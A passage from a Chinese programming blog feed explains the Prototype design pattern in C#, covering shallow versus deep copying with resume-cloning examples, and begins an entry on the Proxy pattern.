punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2019"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume b <span class="token operator">=</span> a            Resume c <span class="token operator">=</span> a            a<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>​        上述两种代码都实现了简历复制的需求，但就占用存储空间来说的话，第二种实现更加节省空间。而就其扩展性来说，两种实现都没有满足很好的扩展，如：<font color="red">要投递不同职位的简历时，毕业生的基本信息是不会发生变化的，但是各个简历所侧重的工作经历是不同的。</font>要实现这样的需求，对于上面的实现就需要修改代码才能实现。而原型模式则可以在原有对象的基础上进行拷贝得到一个新的对象（<font color="blue">在这个可修改新对象的信息</font>）。</p><h3 id="原型实现"><a href="#原型实现" class="headerlink" title="原型实现"></a>原型实现</h3><p><strong>程序类图：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/原型模式/原型实现.png" alt="原型实现"></center><p><strong>代码实现：</strong></p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 原型模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Resume a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2014"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume b <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2015-2018"</span><span class="token punctuation">,</span> <span class="token string">"YY企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume c <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//简历</span>    <span class="token keyword">class</span> <span class="token class-name">Resume</span> <span class="token punctuation">:</span> ICloneable    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> sex<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> age<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> timeArea<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> company<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Resume</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置个人信息</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> sex<span class="token punctuation">,</span> <span class="token keyword">string</span> age<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置工作经历</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token keyword">string</span> timeArea<span class="token punctuation">,</span> <span class="token keyword">string</span> company<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>timeArea <span class="token operator">=</span> timeArea<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>company <span class="token operator">=</span> company<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//显示</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"{0} {1} {2}"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"工作经历：{0} {1}"</span><span class="token punctuation">,</span> timeArea<span class="token punctuation">,</span> company<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 实现接口中的方法</span>        <span class="token keyword">public</span> Object <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>Object<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">MemberwiseClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>结果展示：</strong></p><blockquote><p>小王 男 29<br>工作经历：2010-2014 XX公司<br>小王 男 29<br>工作经历：2015-2018 YY企业<br>小王 男 24<br>工作经历：2010-2014 XX公司</p></blockquote><p>​        上述代码实现了一个人不同工作经历的拷贝，同时也可以对人员的信息进行修改（方便拷贝一波，大家懂的😜）。但上述情况中存在一个问题，原型中字段全部为值类型。<font color="red">MemberwiseClone方法对值类型的字段执行逐位复制，对引用类型字段进行引用复制，也即浅复制。</font>下面的实现方式可能帮助您更好的理解。</p><h3 id="浅复制实现"><a href="#浅复制实现" class="headerlink" title="浅复制实现"></a>浅复制实现</h3><p><strong>程序类图：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/原型模式/浅复制.png" alt="浅复制"></center><p><strong>代码实现：</strong></p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 原型模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Resume a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2014"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume b <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2015-2018"</span><span class="token punctuation">,</span> <span class="token string">"YY企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume c <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"1998-2003"</span><span class="token punctuation">,</span> <span class="token string">"ZZ企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//简历            --真实原型类</span>    <span class="token keyword">class</span> <span class="token class-name">Resume</span> <span class="token punctuation">:</span> ICloneable               <span class="token comment" spellcheck="true">//直接实现系统提供的ICloneable接口</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> sex<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> age<span class="token punctuation">;</span>        <span class="token keyword">private</span> WorkExperience work<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//引用类型</span>        <span class="token keyword">public</span> <span class="token function">Resume</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>            work <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WorkExperience</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置个人信息</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> sex<span class="token punctuation">,</span> <span class="token keyword">string</span> age<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置工作经历</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token keyword">string</span> workDate<span class="token punctuation">,</span> <span class="token keyword">string</span> company<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            work<span class="token punctuation">.</span>WorkDate <span class="token operator">=</span> workDate<span class="token punctuation">;</span>            work<span class="token punctuation">.</span>Company <span class="token operator">=</span> company<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//显示</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"{0} {1} {2}"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"工作经历：{0} {1}"</span><span class="token punctuation">,</span> work<span class="token punctuation">.</span>WorkDate<span class="token punctuation">,</span> work<span class="token punctuation">.</span>Company<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Object <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>Object<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">MemberwiseClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//工作经历</span>    <span class="token keyword">class</span> <span class="token class-name">WorkExperience</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> workDate<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> WorkDate        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> workDate<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> workDate <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> company<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Company        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> company<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> company <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>结果展示：</strong></p><blockquote><p>小王 男 29<br>工作经历：1998-2003 ZZ企业<br>小王 男 29<br>工作经历：1998-2003 ZZ企业<br>小王 男 24<br>工作经历：1998-2003 ZZ企业</p></blockquote><p>​        三个简历输出工作经历是最后一次修改的结果，显然不是我们想要得到的效果。<font color="red">原因：三个Resume对象的work字段都指向最初实例化WorkExperience对象的地址，任何一次修改都会影响到其他两个对象中的work字段</font>。</p><h3 id="深复制实现"><a href="#深复制实现" class="headerlink" title="深复制实现"></a>深复制实现</h3><p><strong>程序类图：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/原型模式/深复制.png" alt="深复制"></center><p><strong>代码实现：</strong></p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 原型模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Resume a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"大鸟"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"1998-2000"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume b <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"1998-2006"</span><span class="token punctuation">,</span> <span class="token string">"YY企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume c <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"1998-2003"</span><span class="token punctuation">,</span> <span class="token string">"ZZ企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//简历</span>    <span class="token keyword">class</span> <span class="token class-name">Resume</span> <span class="token punctuation">:</span> ICloneable    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> sex<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> age<span class="token punctuation">;</span>        <span class="token keyword">private</span> WorkExperience work<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Resume</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>            work <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WorkExperience</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 对应用的克隆</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="work">&lt;/param></span>        <span class="token keyword">private</span> <span class="token function">Resume</span><span class="token punctuation">(</span>WorkExperience work<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>work <span class="token operator">=</span> <span class="token punctuation">(</span>WorkExperience<span class="token punctuation">)</span>work<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置个人信息</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> sex<span class="token punctuation">,</span> <span class="token keyword">string</span> age<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置工作经历</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token keyword">string</span> workDate<span class="token punctuation">,</span> <span class="token keyword">string</span> company<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            work<span class="token punctuation">.</span>WorkDate <span class="token operator">=</span> workDate<span class="token punctuation">;</span>            work<span class="token punctuation">.</span>Company <span class="token operator">=</span> company<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//显示</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"{0} {1} {2}"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"工作经历：{0} {1}"</span><span class="token punctuation">,</span> work<span class="token punctuation">.</span>WorkDate<span class="token punctuation">,</span> work<span class="token punctuation">.</span>Company<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Object <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//使用Resume的构造函数完成对引用对象的克隆</span>            Resume obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>work<span class="token punctuation">)</span><span class="token punctuation">;</span>            obj<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>            obj<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sex<span class="token punctuation">;</span>            obj<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">;</span>            <span class="token keyword">return</span> obj<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//工作经历</span>    <span class="token keyword">class</span> <span class="token class-name">WorkExperience</span> <span class="token punctuation">:</span> ICloneable    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> workDate<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> WorkDate        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> workDate<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> workDate <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> company<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Company        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> company<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> company <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Object <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>Object<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">MemberwiseClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>结果展示：</strong></p><blockquote><p>小王 男 29<br>工作经历：2010-2014 XX公司<br>小王 男 29<br>工作经历：2015-2018 YY企业<br>小王 男 24<br>工作经历：1998-2003 ZZ企业</p></blockquote><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《大话设计模式》</li><li>《设计模式精解及面试攻略》</li></ul>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 原型模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代理模式</title>
      <link href="/2020/08/22/dai-li-mo-shi/"/>
      <url>/2020/08/22/dai-li-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        代理模式为其他对象提供一种代理以控制对这个对象的访问。</p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><ul><li><p><strong>抽象角色(Subject)</strong>：</p><p>代理角色和真实角色必须要继承实现的共同抽象接口</p></li><li><p><strong>代理角色(Proxy)</strong>：</p><p>维护一个相应的真实角色，并可以代替真实角色执行其具有的功能</p></li><li><p><strong>真实角色(Real Subject)</strong>：</p><p>不方便出面而由代理角色代替的实际对象</p></li></ul><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li>分析并创建抽象角色接口</li><li>真实角色实现抽象接口</li><li>代理角色需要指向雇佣其的真实对象，实现抽象接口并隐式调用真实对象的方法</li></ol><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>使用代理追女孩：</p><p><strong>被追求者</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//被追求者</span>    <span class="token keyword">class</span> <span class="token class-name">SchoolGirl</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>送礼物的接口</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//送礼物的接口</span>    <span class="token keyword">interface</span> <span class="token class-name">GiveGift</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><strong>雇主</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//追求者---（雇主）</span>    <span class="token keyword">class</span> <span class="token class-name">Pursuit</span> <span class="token punctuation">:</span> GiveGift    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//雇主心意的女孩对象</span>        SchoolGirl mm<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Pursuit</span><span class="token punctuation">(</span>SchoolGirl mm<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//追求者与被追求者之间的联系</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>mm <span class="token operator">=</span> mm<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token 